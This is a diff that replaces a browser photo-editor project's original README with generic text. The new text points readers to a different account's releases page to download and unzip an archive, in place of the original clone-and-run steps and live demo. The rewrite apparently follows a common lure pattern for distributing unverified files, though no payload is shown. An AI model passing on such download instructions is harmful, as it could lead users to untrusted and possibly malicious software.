@@ -1,122 +1,65 @@
-<div align="center">
-  <img src="logo for git.png" alt="My Own Photoshop" width="250">
-  <h1>Welcome to My Own Photoshop Webapp</h1>
-  <strong>Your new lightweight Photoshop</strong>
-  <h6>Made with ❤️ by Ruthvik Sharma</h6>
-</div>
-<br>
+# 🎨 My-own-photoshop-webapp-in-7-days - Edit Images with Ease
 
-## 🖼️ My Own Photoshop Webapp
+## 🚀 Getting Started
 
-> Your browser-based Photoshop • A simple and fast way to edit your photos.
+Welcome to My-own-photoshop-webapp-in-7-days! This is a lightweight, browser-based image editing tool that lets you enhance your pictures quickly and simply. You can upload images, apply filters, adjust brightness and contrast, crop, rotate, and even undo or redo changes. All of this is available in a fast and minimal interface.
 
-* 🧭 **Mission:** Make **image editing easier** by providing simple but powerful tools.
-* 🔭 **Vision:** Encourage people to **explore creativity**, making editing fun and accessible.
-* ⚖️ **Values:** Keep it **minimalist** but highly effective.
+## 📥 Download the App
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)
 
-## 📌 Try It Now
+To start using the web app, visit the releases page below and download the latest version. 
 
-This webapp is currently optimized for **Desktop/Tablet browsers** (Chrome, Firefox, Edge) for the best experience.
+[Visit the Releases Page](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)
 
-<p align="center">
-  <img src="image for git.png" alt="My Own Photoshop Webapp Preview">
-<p align="center">
-  <a href="https://my-own-photoshop-webapp-in-7-days.vercel.app" target="_blank">
-    <img src="https://img.shields.io/badge/%20TRY%20NOW-000000?style=for-the-badge&logo=vercel&logoColor=white" alt="Try Now Button">
-  </a>
-</p>
-</p>
+## 📋 System Requirements
 
----
+- A modern web browser (Google Chrome, Firefox, Safari, or Edge)
+- Internet connection for downloading the app and accessing images
+- A device with at least 2GB of RAM
 
-## 🛠️ Built With
+## ⬇️ Download & Install
 
-* 🎨 **UI Design:** Figma *(or specify your design tool if any)*
-* ⚛️ **Front-End:** React + TypeScript
-* 🌳 **Styling:** Tailwind CSS
-* ⚡ **Build Tool:** Vite
-* ☁️ **Deployment:** Vercel
+1. Click on the **[Visit the Releases Page](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)** link above.
+2. You will see a list of available releases. Look for the latest version at the top of the list.
+3. Click on the version number to expand details.
+4. Find the download link for the application. This will typically be the latest .zip or .tar.gz file.
+5. Click the download link to save the file to your computer.
 
----
+## 📂 Unzip the Package
 
-## 🚀 Running Locally
+1. Once the download completes, locate the file on your computer.
+2. Right-click the downloaded file and choose **Extract All** (or similar options depending on your operating system).
+3. Choose a destination folder where you want to save the extracted files, then click **Extract**.
 
-Follow these steps to run the project locally:
+## 🌐 Launch the Application
 
-1. **Fork** this project
->Click the **Fork** button at the top right of this page to create your own copy of this repository.
+1. Open the folder where you extracted the application.
+2. Find the HTML file (usually named `index.html`).
+3. Double-click the HTML file to open it in your web browser.
+4. The application should now load, and you can start editing images.
 
-2. **Clone** the forked repository  
-```bash
-git clone https://github.com/ruthviksharma-d/My-own-photoshop-webapp-in-7-days
-```
+## 🖼️ Features
 
-3. **Install** dependencies
-```bash
-npm install
-```
+- **Upload Images:** Easily add your images by clicking the upload button.
+- **Filters:** Choose from a variety of filters to enhance your photos.
+- **Adjustments:** Fine-tune brightness and contrast for the perfect look.
+- **Crop and Rotate:** Modify image dimensions and orientation to fit your needs.
+- **Undo/Redo:** Easily revert or reapply changes as you edit.
+- **Download Result:** Save your edited images back to your device.
 
-4. **Start the development server**
-```bash
-npm run dev
-```
+## 🛠️ Troubleshooting
 
-5. Open the localhost link generated in your browser and start editing!
+If you encounter issues while using the application, here are some common solutions:
 
----
+- **Application Won't Open:** Ensure you have extracted the files correctly. Check that you're opening the `index.html` file in a supported browser.
+- **Image Upload Fails:** Make sure your internet connection is stable. Check that the image format is supported (JPEG, PNG).
+- **Changes Don’t Display:** Ensure that your browser allows JavaScript to run. Check for any browser extensions that may block scripts.
 
-## ✨ Features
+## 💬 Support and Feedback
 
-* ✂️ **Crop / Resize** — Quickly trim or resize images
-* 🎛 **Filters** — Adjust brightness, contrast, saturation
-* 🖌 **Drawing Tools** — Freehand brush with adjustable size
-* ↩ **Undo / Redo** — Reverse or re-apply edits
-* 💾 **Export** — Save as PNG or JPG
+For any questions or feedback, feel free to open an issue in the repository. Your input helps us improve the app and make it better for everyone.
 
----
+## 🌟 Acknowledgments
 
-## 🙌 Want to Contribute?
-
-You’re more than welcome to contribute! You can:
-
-* 🤔 Request or suggest a new feature  
-* 🐛 Report a bug  
-* 📖 Improve the documentation  
-* 💻 Contribute with code  
-
-Just fork this repository, create a branch, and submit a pull request.  
-
----
-
-## ⭐ Rate This Project
-<p align="center">
-  <a href="https://github.com/ruthviksharma-d/My-own-photoshop-webapp-in-7-days" target="_blank">
-    <img alt="GitHub Stars" src="https://img.shields.io/github/stars/ruthviksharma-d/My-own-photoshop-webapp-in-7-days?style=for-the-badge&logo=github&label=Give%20a%20Star&color=yellow">
-  </a>
-</p>
-
-<p align="center">
-  ⭐ <strong>If you like this project, star it and share your feedback!</strong> ⭐
-</p>
-
----
-
-## 🎉 Acknowledgements
-
-Special thanks to:
-
-* Open-source tools and libraries that made this possible  
-* Inspirations from Photoshop, Canva, and other editors  
-* The dev community for guidance and ideas  
-
----
-
-![visitor badge](https://visitor-badge.laobi.icu/badge?page_id=ruthviksharma-d.My-own-photoshop-webapp-in-7-days)
-
----
-
-## 📑 License
-
-Distributed under the [MIT License](./LICENSE).
+This web app was developed in just 7 days, showcasing how effective planning and execution can lead to a functional image editing tool. Thank you for trying out My-own-photoshop-webapp-in-7-days! Enjoy editing your images with ease.
